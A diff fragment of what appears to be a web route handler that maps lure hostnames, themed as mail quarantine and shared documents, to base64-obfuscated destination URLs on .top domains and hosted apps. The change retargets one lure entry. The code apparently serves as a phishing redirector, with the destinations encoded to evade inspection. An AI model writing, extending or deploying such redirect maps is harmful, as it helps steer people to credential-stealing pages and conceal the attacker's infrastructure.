@@ -10,7 +10,7 @@ export async function GET(request) {
   const SUBDOMAIN_MAP = {
     "quarantine-mail-authorize-cloud.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "protected": "aHR0cHM6Ly9tYXJjLWhlY2hlbWEtZG91Y21lbnQtcnNmOHgub25kaWdpdGFsb2NlYW4uYXBw",
-    "flight": "aHR0cHM6Ly9hYm9kZWFuZGNsb3VkcmVhZHMudG9wP0lhS1VySUx0S1Y4MT1kbTl2YjNOeA==",
+    "flight": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "mylinprotect.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "protecteds": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "sinaxiongs": "aHR0cHM6Ly92YW5lc3NhLXNoZWV0LWRvY3VtZW50LXhzYW1iLm9uZGlnaXRhbG9jZWFuLmFwcC8=",
